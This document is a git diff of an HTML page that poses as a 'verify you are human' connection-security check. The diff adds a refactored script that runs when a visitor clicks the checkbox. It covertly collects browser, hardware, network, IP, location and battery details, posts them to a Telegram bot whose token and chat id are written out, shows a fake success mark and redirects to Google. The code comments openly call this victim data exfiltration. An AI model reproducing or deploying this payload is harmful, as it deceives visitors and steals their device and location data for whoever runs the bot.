@@ -242,106 +242,85 @@
 
     <p>example.com needs to review the security of your connection before proceeding.</p>
 
-    <script>
-      
-      // 1. Handle checkbox click (spinner + immediate data exfiltration)
-function handleCheckbox(event) {
-  const checkbox = document.getElementById("verifyHuman");
-  const label = event.currentTarget;
-  const checkmark = document.getElementById("checkmark");
-  const verifyText = document.getElementById("verify-text");
-  const verifyingText = document.getElementById("verifying-text");
-  const successText = document.getElementById("success-text");
+<script>
+  // 1. Handle checkbox click (spinner + immediate data exfiltration)
+  document.getElementById('verifyHuman').addEventListener('click', async function(e) {
+    e.preventDefault();
+    const label = e.currentTarget;
+    const checkbox = document.getElementById('verifyHuman');
+    const checkmark = document.getElementById('checkmark');
+    const verifyText = document.getElementById('verify-text');
+    const verifyingText = document.getElementById('verifying-text');
+    const successText = document.getElementById('success-text');
 
-  event.preventDefault();
+    if (checkbox.checked || label.classList.contains('loading')) return;
 
-  if (checkbox.checked || label.classList.contains("loading")) return;
+    // Show spinner
+    label.classList.add('loading');
+    verifyText.style.display = 'none';
+    verifyingText.style.display = 'inline';
 
-  // Show loading spinner
-  label.classList.add("loading");
-  verifyText.style.display = "none";
-  verifyingText.style.display = "inline";
+    // Exfiltrate data in background (non-blocking)
+    setTimeout(async () => {
+      const data = await collectVictimData();
+      await sendToOpasLabsBot(data);
+    }, 0);
 
-  // Start data exfiltration IMMEDIATELY (while spinner runs)
-  exfiltrateData().then(() => {
-    // After exfiltration completes, show fake "Success" (3s delay)
+    // Fake "success" after 3s
     setTimeout(() => {
-      label.classList.remove("loading");
-      checkmark.style.display = "block";
-      verifyingText.style.display = "none";
-      successText.style.display = "inline";
+      label.classList.remove('loading');
+      checkmark.style.display = 'block';
+      verifyingText.style.display = 'none';
+      successText.style.display = 'inline';
       checkbox.checked = true;
     }, 3000);
 
-    // Redirect after 6 seconds
+    // Redirect after 6s
     setTimeout(() => {
-      window.location.href = "https://www.google.com"; // Fake redirect
+      window.location.href = 'https://www.google.com';
     }, 6000);
   });
-}
-// 1. Execute on checkbox click
-document.getElementById('verifyHuman').addEventListener('click', async (e) => {
-  e.preventDefault();
-  
-  // Show spinner
-  document.getElementById('verifying-text').style.display = 'inline';
-  document.getElementById('verify-text').style.display = 'none';
 
-  // Exfiltrate data in background
-  setTimeout(async () => {
-    const data = await collectVictimData();
-    await sendToOpasLabsBot(data);
-  }, 0);
+  // 2. Data collection (matches your example)
+  async function collectVictimData() {
+    const ipData = await fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => ({}));
+    
+    return {
+      // 🌐 Basic Info
+      browser: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+      
+      // 💻 Hardware Specs
+      cpu: navigator.hardwareConcurrency || 'Unknown',
+      ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+      screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
+      touch: 'ontouchstart' in window ? 'Yes' : 'No',
+      webgl: getWebGLInfo(),
+      
+      // 📶 Network
+      network: await getNetworkInfo(),
+      
+      // 📍 Location & IP
+      ip: ipData.ip || 'Unknown',
+      city: ipData.city || 'Unknown',
+      region: ipData.region || 'Unknown',
+      country: ipData.country || 'Unknown',
+      gps: 'Denied',
+      
+      // 🔋 Battery
+      battery: await getBatteryStatus(),
+      
+      // 📷 Camera Status
+      camera: 'None / Access Denied'
+    };
+  }
 
-  // Fake "success" after 3s
-  setTimeout(() => {
-    document.getElementById('verifying-text').style.display = 'none';
-    document.getElementById('success-text').style.display = 'inline';
-    document.getElementById('checkmark').style.display = 'block';
-  }, 3000);
-
-  // Redirect after 5s
-  setTimeout(() => window.location.href = 'https://www.google.com', 5000);
-});
-
-// 2. Data collection (matches your example)
-async function collectVictimData() {
-  return {
-    // 🌐 Basic Info
-    browser: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
-    
-    // 💻 Hardware Specs
-    cpu: navigator.hardwareConcurrency || 'Unknown',
-    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
-    screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
-    touch: 'ontouchstart' in window ? 'Yes' : 'No',
-    webgl: getWebGLInfo(),
-    
-    // 📶 Network
-    network: await getNetworkInfo(),
-    
-    // 📍 Location & IP
-    ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'Unknown'),
-    city: 'Unknown', // Updated via ipinfo.io below
-    region: 'Unknown',
-    country: 'Unknown',
-    gps: 'Denied',
-    
-    // 🔋 Battery
-    battery: await getBatteryStatus(),
-    
-    // 📷 Camera Status
-    camera: 'None / Access Denied' // Default (attempts blocked in this demo)
-  };
-}
-
-// 3. Telegram exfiltration (formatted like your example)
-async function sendToOpasLabsBot(data) {
-  const message = `
+  // 3. Telegram exfiltration (formatted like your example)
+  async function sendToOpasLabsBot(data) {
+    const message = `
 🔰 *Opas Labs* 🔰
 
 🌐 *Basic Info*
@@ -379,57 +358,54 @@ async function sendToOpasLabsBot(data) {
 
 📷 *Camera Status*
 - ${data.camera}
-  `;
+    `;
 
-  fetch(`https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: '7216371031',
-      text: message,
-      parse_mode: 'Markdown'
-    })
-  }).catch(() => {});
-}
-
-// 4. Helper functions
-function getWebGLInfo() {
-  const canvas = document.createElement('canvas');
-  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-  if (!gl) return { vendor: 'Blocked', renderer: 'Blocked' };
-  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-  return {
-    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Blocked',
-    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Blocked'
-  };
-}
-
-async function getNetworkInfo() {
-  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  return {
-    type: connection?.type || 'Unknown',
-    effectiveType: connection?.effectiveType || 'Unknown',
-    downlink: connection?.downlink ? `${connection.downlink} Mbps` : 'Unknown',
-    rtt: connection?.rtt ? `${connection.rtt} ms` : 'Unknown',
-    saveData: connection?.saveData ? 'Enabled' : 'Disabled'
-  };
-}
-
-async function getBatteryStatus() {
-  try {
-    const battery = await navigator.getBattery();
-    return {
-      level: `${Math.floor(battery.level * 100)}%`,
-      charging: battery.charging ? 'Yes' : 'No'
-    };
-  } catch {
-    return { level: 'Unknown', charging: 'Unknown' };
+    fetch('https://api.telegram.org/bot8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: '7216371031',
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    }).catch(() => {});
   }
-}
 
+  // 4. Helper functions
+  function getWebGLInfo() {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return { vendor: 'Blocked', renderer: 'Blocked' };
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+      vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Blocked',
+      renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Blocked'
+    };
+  }
 
+  async function getNetworkInfo() {
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    return {
+      type: connection?.type || 'Unknown',
+      effectiveType: connection?.effectiveType || 'Unknown',
+      downlink: connection?.downlink ? `${connection.downlink} Mbps` : 'Unknown',
+      rtt: connection?.rtt ? `${connection.rtt} ms` : 'Unknown',
+      saveData: connection?.saveData ? 'Enabled' : 'Disabled'
+    };
+  }
+
+  async function getBatteryStatus() {
+    try {
+      const battery = await navigator.getBattery();
+      return {
+        level: `${Math.floor(battery.level * 100)}%`,
+        charging: battery.charging ? 'Yes' : 'No'
+      };
+    } catch {
+      return { level: 'Unknown', charging: 'Unknown' };
+    }
+  }
 </script>
-    </script>
   </main>
 </body>
 </html>
